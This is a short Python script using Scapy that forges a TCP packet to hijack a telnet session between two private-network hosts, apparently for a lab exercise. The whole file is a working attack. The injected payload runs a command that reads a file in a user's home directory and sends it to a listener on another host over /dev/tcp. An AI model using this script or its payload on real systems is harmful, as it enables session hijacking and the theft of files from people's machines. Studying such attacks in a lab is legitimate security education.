#!/usr/bin/python3

import sys
from scapy.all import *

print("SENDING HIJECT PACKET......")

IPLayer = IP(src="192.168.5.1", dst="192.168.5.2")
TCPLayer = TCP(sport=54100, dport=23, flags="A", seq=533187781, ack=3030212710)

Data = "\r cat /home/kano/z.txt > /dev/tcp/192.168.5.1/9090\r"
pkt = IPLayer/TCPLayer/Data

send(pkt, verbose=0)
